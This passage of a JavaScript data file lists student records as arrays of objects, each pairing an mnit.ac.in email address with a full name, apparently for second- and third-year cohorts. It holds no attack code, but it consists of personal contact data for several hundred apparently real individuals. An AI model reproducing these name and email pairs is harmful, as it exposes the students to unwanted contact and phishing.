        name: 'ROHIT LOHAR'},
        
        
        {mail: '2019UCP1404@mnit.ac.in',
        name: 'SUNIL KUMAR REGAR'},
        
        
        {mail: '2019UCP1429@mnit.ac.in',
        name: 'NILARNAB DEBNATH.'},
        
        
        {mail: '2019UEE1255@mnit.ac.in',
        name: 'SNEH LATA'},
        
        
        {mail: '2019UEE1614@mnit.ac.in',
        name: 'DESHMANI KUMAR'},
        
        
        {mail: '2019UEE1630@mnit.ac.in',
        name: 'DIXIT JANGIR'},
        
        
        {mail: '2019UME1591@mnit.ac.in',
        name: 'KULDEEP MEHAR'},
        
        
        {mail: '2019UME1810@mnit.ac.in',
        name: 'PANUGOTH HARISH'},
        
        
        {mail: '2019UMT1434@mnit.ac.in',
        name: 'ADARI KARTHIK VINAY KUMAR'},
        
        
        {mail: '2019UMT1479@mnit.ac.in',
        name: 'SAKSHAM'},
        
        
        {mail: '2019UCE1099@mnit.ac.in',
        name: 'YATHARTH RAJPUT'},
        
        
        {mail: '2019UCE1110@mnit.ac.in',
        name: 'KESHAV JORWAL'},
        
        
        {mail: '2019UCE1748@mnit.ac.in',
        name: 'SHRESHTHA'},
        
        
        {mail: '2019UCH1063@mnit.ac.in',
        name: 'RAHUL YADAV'},
        
        
        {mail: '2019UCH1451@mnit.ac.in',
        name: 'DEVESH MARKANDEY'},
        
        
        {mail: '2019UCH1556@mnit.ac.in',
        name: 'GAURAV KUMAR MEENA'},
        
        
        {mail: '2019UCH1560@mnit.ac.in',
        name: 'SONAM KUMARI'},
        
        
        {mail: '2019UCH1595@mnit.ac.in',
        name: 'AJIT SAINI'},
        
        
        {mail: '2019UCP1790@mnit.ac.in',
        name: 'VISHAL PANDEY'},
        
        
        {mail: '2019UEC1042@mnit.ac.in',
        name: 'ABHAY BHATT'},
        
        
        {mail: '2019UEE1267@mnit.ac.in',
        name: 'CHETAN GOYAL'},
        
        
        {mail: '2019UEE1316@mnit.ac.in',
        name: 'RAJENDRA PATEL'},
        
        
        {mail: '2019UEE1673@mnit.ac.in',
        name: 'RIDDHI KOHLI'},
        
        
        {mail: '2019UME1231@mnit.ac.in',
        name: 'AMAN SANCHETI'},
        
        
        {mail: '2019UME1715@mnit.ac.in',
        name: 'PRATEEK UPADHYAY'},
        
        
        {mail: '2019UMT1324@mnit.ac.in',
        name: 'SAKSHI SINGH'},
        
        
        {mail: '2019UMT1478@mnit.ac.in',
        name: 'MONIKA SARSWAT'},
        
        
        {mail: '2019UMT1496@mnit.ac.in',
        name: 'VIJAY PARMAR'},
        
        
        {mail: '2019UMT1618@mnit.ac.in',
        name: 'YASH VARDHAN'},
        
        
        {mail: '2019UMT1842@mnit.ac.in',
        name: 'DEV PRATAP SINGH PARIHAR'},
        
        
        {mail: '2019UCE1064@mnit.ac.in',
        name: 'GAYATRY PRAKASH'},
        
        
        {mail: '2019UCE1151@mnit.ac.in',
        name: 'SANJAY MURMU'},
        
        
        {mail: '2019UCE1162@mnit.ac.in',
        name: 'ARYAN SRIVASTAVA'},
        
        
        {mail: '2019UCE1617@mnit.ac.in',
        name: 'HARIOM VAISHNAV'},
        
        
        {mail: '2019UCE1784@mnit.ac.in',
        name: 'SACHIN KUMAR'},
        
        
        {mail: '2019UCH1437@mnit.ac.in',
        name: 'SHARAD PRAJAPATI'},
        
        
        {mail: '2019UCH1543@mnit.ac.in',
        name: 'SOUMYA AGRAWAL'},
        
        
        {mail: '2019UCH1566@mnit.ac.in',
        name: 'MOHIT PRAJAPAT'},
        
        
        {mail: '2019UCH1570@mnit.ac.in',
        name: 'MITALI SINGH'},
        
        
        {mail: '2019UCH1670@mnit.ac.in',
        name: 'KALYANI JAIN'},
        
        
        {mail: '2019UCH1803@mnit.ac.in',
        name: 'SACHIN DHETARWAL'},
        
        
        {mail: '2019UCP1317@mnit.ac.in',
        name: 'KRINA JAYESH SHETH'},
        
        
        {mail: '2019UCP1414@mnit.ac.in',
        name: 'DEV MEENA'},
        
        
        {mail: '2019UCP1552@mnit.ac.in',
        name: 'ANIRUDH KRISHNAMURTHY'},
         
        
        {mail: '2019UCP1632@mnit.ac.in',
        name: 'PANKAJ KUMAWAT'},
        
        
        {mail: '2019UCP1772@mnit.ac.in',
        name: 'ANKIT YADAV'},
        
        
        {mail: '2019UEC1005@mnit.ac.in',
        name: 'EKTA VERMA'},
        
        
        {mail: '2019UEE1465@mnit.ac.in',
        name: 'PRAKHAR SINGH'},
        
        
        {mail: '2019UME1235@mnit.ac.in',
        name: 'PARASTAR PAHADIYA'},
        
        
        {mail: '2019UMT1707@mnit.ac.in',
        name: 'GOVIND SINGH'},
        
        
        {mail: '2019UCE1119@mnit.ac.in',
        name: 'VIVEK SOLANKI'},
        
        
        {mail: '2019UCE1149@mnit.ac.in',
        name: 'RIDAM SHARMA'},
        
        
        {mail: '2019UCE1564@mnit.ac.in',
        name: 'NANDINI TAPARIYA'},
        
        
        {mail: '2019UCE1640@mnit.ac.in',
        name: 'KORRA SHARATH NAIK'},
        
        
        {mail: '2019UCH1545@mnit.ac.in',
        name: 'DEV KUMAR VEDI'},
        
        
        {mail: '2019UCH1710@mnit.ac.in',
        name: 'JHANVI SHARMA'},
        
        
        {mail: '2019UCP1376@mnit.ac.in',
        name: 'DEVENDRA PRAJAPAT'},
        
        
        {mail: '2019UCP1408@mnit.ac.in',
        name: 'HARIPRAVEER Y SHARAN'},
        
        
        {mail: '2019UEC1002@mnit.ac.in',
        name: 'SUKRITI BOHRA'},
        
        
        {mail: '2019UEC1600@mnit.ac.in',
        name: 'KARAN KUMAR BAIRWA'},
        
        
        {mail: '2019UEC1660@mnit.ac.in',
        name: 'AADESH AGRAWAL'},
        
        
        {mail: '2019UEE1131@mnit.ac.in',
        name: 'AMAN KUMAR YADAV'},
        
        
        {mail: '2019UEE1216@mnit.ac.in',
        name: 'SANAD KUMAR JHARIYA'},
        
        
        {mail: '2019UEE1282@mnit.ac.in',
        name: 'BOBBY MATHUR'},
        
        
        {mail: '2019UEE1658@mnit.ac.in',
        name: 'AYUSH SHARMA'},
        
        
        {mail: '2019UME1189@mnit.ac.in',
        name: 'VISHAL KUMAR'},
        
        
        {mail: '2019UME1488@mnit.ac.in',
        name: 'AAYUSH KUMAR RAI'},
        
        
        {mail: '2019UME1542@mnit.ac.in',
        name: 'SHASHANK KOOLWAL'},
        
        
        {mail: '2019UME1706@mnit.ac.in',
        name: 'ALKA MEENA'},
        
        
        {mail: '2019UMT1812@mnit.ac.in',
        name: 'ABHIJEET KAR'}
        ]


const third_year=[

            {mail: '2018UCE1024@mnit.ac.in',
            name: 'NAVNEET KUMAR'},
            
            
            {mail: '2018UCE1048@mnit.ac.in',
            name: 'AWEE CHAURASIA'},
            
            
            {mail: '2018UCE1076@mnit.ac.in',
            name: 'VINEETA SONI'},
            
            
            {mail: '2018UCE1095@mnit.ac.in',
            name: 'VIJAY KUMAR MAHAWAR'},
            
            
            {mail: '2018UCE1098@mnit.ac.in',
            name: 'VIVEK KUMAR YADAV'},
            
            
            {mail: '2018UCE1100@mnit.ac.in',
            name: 'NISHANT SINGH'},
            
            
            {mail: '2018UCE1101@mnit.ac.in',
            name: 'GAURAV BAUHARA'},
            
            
            {mail: '2018UCE1102@mnit.ac.in',
            name: 'ABHISHEK MAURYA'},
            
            
            {mail: '2018UCE1103@mnit.ac.in',
            name: 'ARSHIKA TOMAR'},
            
            
            {mail: '2018UCE1106@mnit.ac.in',
            name: 'SAURABH KUMAR MEENA'},
            
            
            {mail: '2018UCE1107@mnit.ac.in',
            name: 'TARUN PREMANI'},
            
            
            {mail: '2018UCE1109@mnit.ac.in',
            name: 'DEVANG SWAMI'},
            
            
            {mail: '2018UCE1110@mnit.ac.in',
            name: 'UMANG SHARMA'},
            
            
            {mail: '2018UCE1111@mnit.ac.in',
            name: 'SHIVAM MISHRA'},
            
            
            {mail: '2018UCE1112@mnit.ac.in',
            name: 'MANAS BRAMHA'},
            
            
            {mail: '2018UCE1114@mnit.ac.in',
            name: 'APARAJITA DWIVEDI'},
            
            
            {mail: '2018UCE1115@mnit.ac.in',
            name: 'RAHUL CHAUHAN'},
            
            
            {mail: '2018UCE1118@mnit.ac.in',
            name: 'PUNEET ARORA'},
            
            
            {mail: '2018UCE1119@mnit.ac.in',
            name: 'SONI'},
            
            
            {mail: '2018UCE1120@mnit.ac.in',
            name: 'AMAN DEEP SINGH'},
            
            
            {mail: '2018UCE1121@mnit.ac.in',
            name: 'VIVEK KUMAR'},
            
            
            {mail: '2018UCE1122@mnit.ac.in',
            name: 'SUJIT KUMAR GUPTA'},
            
            
            {mail: '2018UCE1123@mnit.ac.in',
            name: 'MOHIT JAIN'},
            
            
            {mail: '2018UCE1124@mnit.ac.in',
            name: 'KIRTI KUMAR'},
            
            
            {mail: '2018UCE1128@mnit.ac.in',
            name: 'AYUSH VERMA'},
            
            
            {mail: '2018UCE1129@mnit.ac.in',
            name: 'RAMAVATH KUMAR'},
            
            
            {mail: '2018UCE1130@mnit.ac.in',
            name: 'TELUKUTLA LAKSHMA REDDY'},
            
            
            {mail: '2018UCE1133@mnit.ac.in',
            name: 'GIRDHAR SINGH'},
            
            
            {mail: '2018UCE1134@mnit.ac.in',
            name: 'AMAN KUMAR'},
            
            
            {mail: '2018UCE1138@mnit.ac.in',
            name: 'SOMESH CHOUDHARY'},
            
            
            {mail: '2018UCE1139@mnit.ac.in',
            name: 'AYUSH GOYAL'},
            
            
            {mail: '2018UCE1141@mnit.ac.in',
            name: 'KARTIKEY TIWARI'},
            
            
            {mail: '2018UCE1142@mnit.ac.in',
            name: 'LOKESH KUMAR KUMAWAT'},
            
            
            {mail: '2018UCE1143@mnit.ac.in',
            name: 'DEEPALI MOONDRA'},
            
            
            {mail: '2018UCE1144@mnit.ac.in',
            name: 'GAURAV SHARMA'},
            
            
            {mail: '2018UCE1146@mnit.ac.in',
            name: 'DILKHUSH MEENA'},
            
            
            {mail: '2018UCE1147@mnit.ac.in',
            name: 'VIVEK GAUR'},
            
            
            {mail: '2018UCE1149@mnit.ac.in',
            name: 'ARYAN KUSHWAHA'},
            
            
            {mail: '2018UCE1156@mnit.ac.in',
            name: 'NIPUN MATHUR'},
            
            
            {mail: '2018UCE1157@mnit.ac.in',
            name: 'NISHANT KUMAR'},
            
            
            {mail: '2018UCE1158@mnit.ac.in',
            name: 'AJEET KUMAR MAURYA'},
            
            
            {mail: '2018UCE1161@mnit.ac.in',
            name: 'DEEPAK KUMAR DAILA'},
            
            
            {mail: '2018UCE1163@mnit.ac.in',
            name: 'SHASHIKANT'},
            
            
            {mail: '2018UCE1164@mnit.ac.in',
            name: 'KSHITIZ KAMAL'},
            
            
            {mail: '2018UCE1166@mnit.ac.in',
            name: 'KAUTS SOMESHWAR MISHRA'},
            
            
            {mail: '2018UCE1167@mnit.ac.in',
            name: 'DHARMESH JANGID'},
            
            
            {mail: '2018UCE1171@mnit.ac.in',
            name: 'PUSHPENDRA KAVIA'},
            
            
            {mail: '2018UCE1172@mnit.ac.in',
            name: 'DEVENDRA GODARA'},
            
            
            {mail: '2018UCE1176@mnit.ac.in',
            name: 'KRATANSHI HARIT'},
            
            
            {mail: '2018UCE1179@mnit.ac.in',
            name: 'AYUSH BIJARNIYA'},
            
            
            {mail: '2018UCE1188@mnit.ac.in',
            name: 'SURAJ KUMAR RAIGAR'},
            
            
            {mail: '2018UCE1195@mnit.ac.in',
            name: 'RINKU KUMARI'},
            
            
            {mail: '2018UCE1196@mnit.ac.in',
            name: 'ARIHANT LODHA'},
            
            
            {mail: '2018UCE1199@mnit.ac.in',
            name: 'SHUBHAM SAGAR'},
            
            
            {mail: '2018UCE1205@mnit.ac.in',
            name: 'ANKIT SINGH'},
            
            
            {mail: '2018UCE1207@mnit.ac.in',
            name: 'HITARTH MEENA'},
            
            
            {mail: '2018UCE1213@mnit.ac.in',
            name: 'ASHISH KUMAR'},
            
            
            {mail: '2018UCE1214@mnit.ac.in',
            name: 'MANISH KUMAR SINGODIYA'},
            
            
            {mail: '2018UCE1220@mnit.ac.in',
            name: 'MAMTA CHOUDHARY'},
            
            
            {mail: '2018UCE1221@mnit.ac.in',
            name: 'SWAPNIL'},
            
            
            {mail: '2018UCE1222@mnit.ac.in',
            name: 'RAMPRAKASH CHHABA'},
            
            
            {mail: '2018UCE1223@mnit.ac.in',
            name: 'KAPIL SAMRIYA'},
            
            
            {mail: '2018UCE1263@mnit.ac.in',
            name: 'SRIJAN SINGH'},
            
            
            {mail: '2018UCE1280@mnit.ac.in',
            name: 'JONNADULA NAGA SAHITHI'},
            
            
            {mail: '2018UCE1283@mnit.ac.in',
            name: 'RADHIKA'},
            
            
            {mail: '2018UCE1286@mnit.ac.in',
            name: 'ABHAY KUSHWAHA'},
            
            
            {mail: '2018UCE1332@mnit.ac.in',
            name: 'MUSKAN GARG'},
            
            
            {mail: '2018UCE1338@mnit.ac.in',
            name: 'NANDINI GOYAL'},
            
            
            {mail: '2018UCE1375@mnit.ac.in',
            name: 'PRAKHAR'},
            
            
            {mail: '2018UCE1378@mnit.ac.in',
            name: 'HARSH KUMAR AGARWAL'},
            
            
            {mail: '2018UCE1381@mnit.ac.in',
            name: 'KAPIL KUMAR SABDHANI'},
            
            
            {mail: '2018UCE1391@mnit.ac.in',
            name: 'KOMAL DIWAKAR'},
            
            
            {mail: '2018UCE1401@mnit.ac.in',
            name: 'KIRAN MEENA'},
            
            
            {mail: '2018UCE1431@mnit.ac.in',
            name: 'SAMEER KUMAR'},
            
            
            {mail: '2018UCE1445@mnit.ac.in',
            name: 'RAGHUPAT PRAJAPAT'},
            
            
            {mail: '2018UCE1457@mnit.ac.in',
            name: 'ADNAN QUASAIN'},
            
            
            {mail: '2018UCE1461@mnit.ac.in',
            name: 'SATYANARAYAN DHAKAR'},
            
            
            {mail: '2018UCE1475@mnit.ac.in',
            name: 'PIYUSH GARG'},
            
            
            {mail: '2018UCE1510@mnit.ac.in',
            name: 'ABHISHEK YADAV'},
            
            
            {mail: '2018UCE1512@mnit.ac.in',
            name: 'ALOK KUMAR'},
            
            
            {mail: '2018UCE1549@mnit.ac.in',
            name: 'SAURABH KUMAR'},
            
            
            {mail: '2018UCE1551@mnit.ac.in',
            name: 'MANAS KASHYAP'},
            
            
            {mail: '2018UCE1607@mnit.ac.in',
            name: 'SACHIN KUMAR'},
            
            
            {mail: '2018UCE1608@mnit.ac.in',
            name: 'VISHAL YADAV'},
            
            
            {mail: '2018UCE1627@mnit.ac.in',
            name: 'PARITOSH MISHRA'},
            
            
            {mail: '2018UCE1657@mnit.ac.in',
            name: 'NEMAT BRAHMACHARI'},
            
            
            {mail: '2018UCE1679@mnit.ac.in',
            name: 'RAJESH KUMAR'},
            
            
            {mail: '2018UCE1684@mnit.ac.in',
            name: 'PIYUSH CHARAN'},
            
            
            {mail: '2018UCE1687@mnit.ac.in',
            name: 'SHESH JEET'},
            
            
            {mail: '2018UCE1725@mnit.ac.in',
            name: 'SYED AMEENUDDIN HUSSAINI'},
            
            
            {mail: '2018UCE1763@mnit.ac.in',
            name: 'JAYANT PACHORIA'},
            
            
            {mail: '2018UCE1776@mnit.ac.in',
            name: 'ARYAN VERMA'},
            
            
            {mail: '2018UCE1780@mnit.ac.in',
            name: 'SIDDHARTH THAKRAL'},
            
            
            {mail: '2018UCE1798@mnit.ac.in',
            name: 'ABHAY KUMAR'},
            
            
            {mail: '2018UCE1799@mnit.ac.in',
            name: 'SHIVANSH PANDEY'},
            
            
            {mail: '2018UCE1811@mnit.ac.in',
            name: 'GAURAV SAINI'},
            
            
            {mail: '2018UCE1815@mnit.ac.in',
            name: 'AMAR RAJ'},
            
            
            {mail: '2018UCH1011@mnit.ac.in',
            name: 'RAHUL KUMAR'},
            
            
            {mail: '2018UCH1029@mnit.ac.in',
            name: 'SANCHITA BISARIA NIGAM'},
            
            
            {mail: '2018UCH1065@mnit.ac.in',
            name: 'TUSHARIKA SHARMA'},
            
            
            {mail: '2018UCH1066@mnit.ac.in',
            name: 'DEEPJYOTI ROY'},
            
            
            {mail: '2018UCH1085@mnit.ac.in',
            name: 'SHASHANK SINGH'},
            
            
            {mail: '2018UCH1132@mnit.ac.in',
            name: 'HARSH ABHINANDAN'},
            
            
            {mail: '2018UCH1135@mnit.ac.in',
            name: 'YOGESH CHARAN'},
            
            
            {mail: '2018UCH1162@mnit.ac.in',
            name: 'SHUBH SINGHAL'},
            
            
            {mail: '2018UCH1181@mnit.ac.in',
            name: 'MANISH SAINI'},
            
            
            {mail: '2018UCH1187@mnit.ac.in',
            name: 'VIRENDER'},
            
            
            {mail: '2018UCH1189@mnit.ac.in',
            name: 'UPANSHU GUPTA'},
            
            
            {mail: '2018UCH1193@mnit.ac.in',
            name: 'VINAYAK SHARMA'},
            
            
            {mail: '2018UCH1198@mnit.ac.in',
            name: 'GOUTAM'},
            
            
            {mail: '2018UCH1226@mnit.ac.in',
            name: 'HIMANSHU GIRRAJ MEENA'},
            
            
            {mail: '2018UCH1254@mnit.ac.in',
            name: 'KARTIK BOYAL'},
            
            
            {mail: '2018UCH1257@mnit.ac.in',
            name: 'MUKUND BIYANI'},
            
            
            {mail: '2018UCH1313@mnit.ac.in',
            name: 'HITESH MANOJ SINGH'},
            
            
            {mail: '2018UCH1327@mnit.ac.in',
            name: 'MEENAL RAWLANI'},
            
            
            {mail: '2018UCH1334@mnit.ac.in',
            name: 'NIHARIKA AGGARWAL'},
            
            
            {mail: '2018UCH1373@mnit.ac.in',
            name: 'TANMAY SAFAL'},
            
            
            {mail: '2018UCH1379@mnit.ac.in',
            name: 'MANU AGARWAL'},
            
            
            {mail: '2018UCH1407@mnit.ac.in',
            name: 'AKASH GUPTA'},
            
            
            {mail: '2018UCH1476@mnit.ac.in',
            name: 'KSHITIJ PAL'},
            
            
            {mail: '2018UCH1486@mnit.ac.in',
            name: 'PREETI ROHALAN'},
            
            
            {mail: '2018UCH1492@mnit.ac.in',
            name: 'NIKHIL CHANDEL'},
            
            
            {mail: '2018UCH1508@mnit.ac.in',
            name: 'HEENA UPADHYAY'},
            
            
            {mail: '2018UCH1516@mnit.ac.in',
            name: 'MANGESH PATHAK'},
            
            
            {mail: '2018UCH1522@mnit.ac.in',
            name: 'BHASKAR JHA'},
            
            
            {mail: '2018UCH1523@mnit.ac.in',
            name: 'DINESH KUMAR'},
            
            
            {mail: '2018UCH1526@mnit.ac.in',
            name: 'JEEVESH KATIYAR'},
            
            
            {mail: '2018UCH1527@mnit.ac.in',
            name: 'SHIVANK CHATURVEDI'},
            
            
            {mail: '2018UCH1528@mnit.ac.in',
            name: 'HARSHIT AGARWAL'},
            
            
            {mail: '2018UCH1530@mnit.ac.in',
            name: 'JILUKARA SATHVIKA'},
            
            
            {mail: '2018UCH1533@mnit.ac.in',
            name: 'HARDIK GUPTA'},
            
            
            {mail: '2018UCH1536@mnit.ac.in',
            name: 'ABHINAV KUMAR SINGH'},
            
            
            {mail: '2018UCH1537@mnit.ac.in',
            name: 'CHINMAY TIWARI'},
            
            
            {mail: '2018UCH1546@mnit.ac.in',
            name: 'AKSHITA'},
            
            
            {mail: '2018UCH1550@mnit.ac.in',
            name: 'ATUL KUMAR PRAJAPATI'},
            
            
            {mail: '2018UCH1559@mnit.ac.in',
            name: 'HARSHIT GARG'},
            
            
            {mail: '2018UCH1567@mnit.ac.in',
            name: 'SHRIYA MODIA'},
            
            
            {mail: '2018UCH1585@mnit.ac.in',
            name: 'SARANSH TAYAL'},
            
            
            {mail: '2018UCH1595@mnit.ac.in',
            name: 'NAMAN GUJAR'},
            
            
            {mail: '2018UCH1596@mnit.ac.in',
            name: 'KAVISH'},
            
            
            {mail: '2018UCH1598@mnit.ac.in',
            name: 'ANJALI'},
            
            
            {mail: '2018UCH1604@mnit.ac.in',
            name: 'KATHULA JAHNAVI'},
            
            
            {mail: '2018UCH1606@mnit.ac.in',
            name: 'PRANAV PRAVIN SAWANT'},
            
            
            {mail: '2018UCH1609@mnit.ac.in',
            name: 'SAURABH GOYAL'},
            
            
            {mail: '2018UCH1617@mnit.ac.in',
            name: 'YAGYAPAL SINGH SHEKHAWAT'},
            
            
            {mail: '2018UCH1618@mnit.ac.in',
            name: 'DIWANSHU MITTAL'},
            
            
            {mail: '2018UCH1619@mnit.ac.in',
            name: 'YUKTA KAKKAR'},
            
            
            {mail: '2018UCH1621@mnit.ac.in',
            name: 'AKSHITA MAHESHWARI'},
            
            
            {mail: '2018UCH1629@mnit.ac.in',
            name: 'MINSHUL KHANDELWAL'},
            
            
            {mail: '2018UCH1632@mnit.ac.in',
            name: 'STUTI JAIN'},
            
            
            {mail: '2018UCH1633@mnit.ac.in',
            name: 'SHIVAM MISHRA'},
            
            
            {mail: '2018UCH1634@mnit.ac.in',
            name: 'URMILA CHOUDHARY'},
            
            
            {mail: '2018UCH1636@mnit.ac.in',
            name: 'SAMEER JAIN'},
            
            
            {mail: '2018UCH1637@mnit.ac.in',
            name: 'AKASH BANSAL'},
            
            
            {mail: '2018UCH1640@mnit.ac.in',
            name: 'AKSHAY KUMAR'},
            
            
            {mail: '2018UCH1641@mnit.ac.in',
            name: 'HARSHIT VINOD ANWEKAR'},
            
            
            {mail: '2018UCH1643@mnit.ac.in',
            name: 'ABHISHEK SIHAG'},
            
            
            {mail: '2018UCH1644@mnit.ac.in',
            name: 'ANAND GOYAL'},
            
            
            {mail: '2018UCH1645@mnit.ac.in',
            name: 'ASHISH ANAND'},
            
            
            {mail: '2018UCH1646@mnit.ac.in',
            name: 'MRIDUL TRIPATHI'},
            
            
            {mail: '2018UCH1651@mnit.ac.in',
            name: 'NAVEEN KUMAR SAINI'},
            
            
            {mail: '2018UCH1653@mnit.ac.in',
            name: 'ASHOK BANSIWAL'},
            
            
            {mail: '2018UCH1654@mnit.ac.in',
            name: 'DIVYA BHATI'},
            
            
            {mail: '2018UCH1656@mnit.ac.in',
            name: 'DARSHANA PALIWAL'},
            
            
            {mail: '2018UCH1659@mnit.ac.in',
            name: 'PRACHI MAHAR'},
            
            
            {mail: '2018UCH1661@mnit.ac.in',
            name: 'MUDE RAMESH NAIK'},
            
            
            {mail: '2018UCH1663@mnit.ac.in',
            name: 'RAHUL'},
            
            
            {mail: '2018UCH1664@mnit.ac.in',
            name: 'KEVIN MITESH DHOLAKIA'},
            
            
            {mail: '2018UCH1667@mnit.ac.in',
            name: 'JOGENDRA'},
            
            
            {mail: '2018UCH1670@mnit.ac.in',
            name: 'GUGULOTH SRIDHAR'},
            
            
            {mail: '2018UCH1685@mnit.ac.in',
            name: 'HARSHIT'},
            
            
            {mail: '2018UCH1689@mnit.ac.in',
            name: 'ANKITA KUMARI'},
            
            
            {mail: '2018UCH1693@mnit.ac.in',
            name: 'ANKIT KUMAR BANSAL'},
            
            
            {mail: '2018UCH1702@mnit.ac.in',
            name: 'MUSKAN ROY'},
            
            
            {mail: '2018UCH1735@mnit.ac.in',
            name: 'SIDDHARTH JAIN'},
            
            
            {mail: '2018UCH1764@mnit.ac.in',
            name: 'SUDHANSHU UPADHYAY'},
            
            
            {mail: '2018UCH1769@mnit.ac.in',
            name: 'TARUN GUPTA'},
            
            
            {mail: '2018UCH1770@mnit.ac.in',
            name: 'REENA NETAM'},
            
            
            {mail: '2018UCH1771@mnit.ac.in',
            name: 'AKASH SINGHAL'},
            
            
            {mail: '2018UCH1772@mnit.ac.in',
            name: 'CHARU'},
            
            
            {mail: '2018UCH1783@mnit.ac.in',
            name: 'KHUSHAL KUMAR SWAMI'},
            
            
            {mail: '2018UCH1786@mnit.ac.in',
            name: 'NEHA GOYAL'},
            
            
            {mail: '2018UCH1802@mnit.ac.in',
            name: 'SHIVAM CHATURVEDI'},
            
            
            {mail: '2018UCH1805@mnit.ac.in',
            name: 'SAMEER TAILOR'},
            
            
            {mail: '2018UCH1810@mnit.ac.in',
            name: 'CHAVALI BALA VENKATA SUMANTH'},
            
            
            {mail: '2018UCH1822@mnit.ac.in',
            name: 'AKSHAY KUMAR'},
            
            
            {mail: '2018UCH1824@mnit.ac.in',
            name: 'GULSHAN ROLANIA'},
            
            
            {mail: '2018UCH1825@mnit.ac.in',
            name: 'DEENDAYAL MEENA'},
            
            
            {mail: '2018UCP1030@mnit.ac.in',
            name: 'NITESH SHARMA'},
            
            
            {mail: '2018UCP1097@mnit.ac.in',
            name: 'RISHABH'},
            
            
            {mail: '2018UCP1136@mnit.ac.in',
            name: 'ROHIT KUMAR SAHU'},
            
            
            {mail: '2018UCP1140@mnit.ac.in',
            name: 'HARSHA'},
            
            
            {mail: '2018UCP1154@mnit.ac.in',
            name: 'AKASH SHARMA'},
            
            
            {mail: '2018UCP1173@mnit.ac.in',
            name: 'DEEPAK'},
            
            
            {mail: '2018UCP1204@mnit.ac.in',
            name: 'SANDEEP KUMAR'},
            
            
            {mail: '2018UCP1265@mnit.ac.in',
            name: 'SANSKAR SONI'},
            
            
            {mail: '2018UCP1270@mnit.ac.in',
            name: 'RISHI ROSHAN SINGH'},
            
            
            {mail: '2018UCP1287@mnit.ac.in',
            name: 'AKSHAT SINGLA'},
            
            
            {mail: '2018UCP1295@mnit.ac.in',
            name: 'KAMAL'},
            
            
            {mail: '2018UCP1298@mnit.ac.in',
            name: 'MOHIT MISHRA'},
            
            
            {mail: '2018UCP1305@mnit.ac.in',
            name: 'ANUJ KUMAR KANOJIA'},
            
            
            {mail: '2018UCP1317@mnit.ac.in',
            name: 'DEVAL'},
            
            
            {mail: '2018UCP1319@mnit.ac.in',
            name: 'PARMAR ABHISHEK'},
            
            
            {mail: '2018UCP1323@mnit.ac.in',
            name: 'KARAN MAURYA'},
            
            
            {mail: '2018UCP1325@mnit.ac.in',
            name: 'NITIN SINGH BHADORIA'},
            
            
            {mail: '2018UCP1328@mnit.ac.in',
            name: 'ABHINAY CHIRANJILAL MEENA'},
            
            
            {mail: '2018UCP1329@mnit.ac.in',
            name: 'S KRISHNA KISHORE'},
            
            
            {mail: '2018UCP1348@mnit.ac.in',
            name: 'ACHALA RAM'},
            
            
            {mail: '2018UCP1349@mnit.ac.in',
            name: 'TANMAY GUPTA'},
            
            
            {mail: '2018UCP1354@mnit.ac.in',
            name: 'PRIYANKA KUMARI'},
            
            
            {mail: '2018UCP1360@mnit.ac.in',
            name: 'SHUBHAM MODI'},
            
            
            {mail: '2018UCP1382@mnit.ac.in',
            name: 'DEV MILAN MEHTA'},
            
            
            {mail: '2018UCP1385@mnit.ac.in',
            name: 'TARUN KUMAR MISHRA'},
            
            
            {mail: '2018UCP1386@mnit.ac.in',
            name: 'DEVANSHI MITTAL'},
            
            
            {mail: '2018UCP1388@mnit.ac.in',
            name: 'PRATEEK SHARMA'},
            
            
            {mail: '2018UCP1389@mnit.ac.in',
            name: 'NAVDEEP SINGH DHARIWAL'},
            
            
            {mail: '2018UCP1398@mnit.ac.in',
            name: 'ABHISHEK NARAIN DAS BHATIA'},
            
            
            {mail: '2018UCP1400@mnit.ac.in',
            name: 'HARSHA MAJHI'},
            
            
            {mail: '2018UCP1405@mnit.ac.in',
            name: 'NIKHIL SAIN'},
            
            
            {mail: '2018UCP1410@mnit.ac.in',
            name: 'PRADEEP DUKIYA'},
            
            
            {mail: '2018UCP1411@mnit.ac.in',
            name: 'PRANAY KANJOLIA'},
            
            
            {mail: '2018UCP1414@mnit.ac.in',
            name: 'VIJAY SWAMI'},
            
            
            {mail: '2018UCP1416@mnit.ac.in',
            name: 'YASHWANT LOHAR'},
            
            
            {mail: '2018UCP1421@mnit.ac.in',
            name: 'SHUBHAM YADAV'},
            
            
            {mail: '2018UCP1422@mnit.ac.in',
            name: 'HARDIK C SOLANKI'},
            
            
            {mail: '2018UCP1423@mnit.ac.in',
            name: 'Aditya Tulsiyan'},
            
            
            {mail: '2018UCP1425@mnit.ac.in',
            name: 'KARTIK SHARMA'},
            
            
            {mail: '2018UCP1427@mnit.ac.in',
            name: 'SHUBHAM MEENA'},
            
            
            {mail: '2018UCP1436@mnit.ac.in',
            name: 'RAHUL AMARWAL'},
            
            
            {mail: '2018UCP1437@mnit.ac.in',
            name: 'MAYANK SOLANKI'},
            
            
            {mail: '2018UCP1438@mnit.ac.in',
            name: 'KESHAV SONI'},
            
            
            {mail: '2018UCP1444@mnit.ac.in',
            name: 'PRANSHU VYAS'},
            
            
            {mail: '2018UCP1446@mnit.ac.in',
            name: 'CHINTAN ASHVIN KHOONT'},
            
            
            {mail: '2018UCP1448@mnit.ac.in',
            name: 'MOKSH AHUJA'},
            
            
            {mail: '2018UCP1449@mnit.ac.in',
            name: 'TANUJ AGARWAL'},
            
            
            {mail: '2018UCP1451@mnit.ac.in',
            name: 'NEETIN KUMAR'},
            
            
            {mail: '2018UCP1453@mnit.ac.in',
            name: 'SULAKSHANA CHOUHAN'},
            
            
            {mail: '2018UCP1455@mnit.ac.in',
            name: 'ANAND KUMAR'},
            
            
            {mail: '2018UCP1456@mnit.ac.in',
            name: 'AATESH'},
            
            
            {mail: '2018UCP1459@mnit.ac.in',
            name: 'SHUBHAM JAIN'},
            
            
            {mail: '2018UCP1460@mnit.ac.in',
            name: 'DHRUV GOYAL'},
            
            
            {mail: '2018UCP1464@mnit.ac.in',
            name: 'NANDINI ROY'},
            
            
            {mail: '2018UCP1465@mnit.ac.in',
            name: 'SONAL AGRAWAL'},
            
            
            {mail: '2018UCP1466@mnit.ac.in',
            name: 'PRATEEK MAHESHWARI'},
            
            
            {mail: '2018UCP1470@mnit.ac.in',
            name: 'AMARNATH SAHU'},
            
            
            {mail: '2018UCP1471@mnit.ac.in',
            name: 'GUNJAN SHEKHAWAT'},
            
            
            {mail: '2018UCP1472@mnit.ac.in',
            name: 'DHWANI NILESH AGRAWAL'},
            
            
            {mail: '2018UCP1474@mnit.ac.in',
            name: 'ADARSH KUMAR'},
            
            
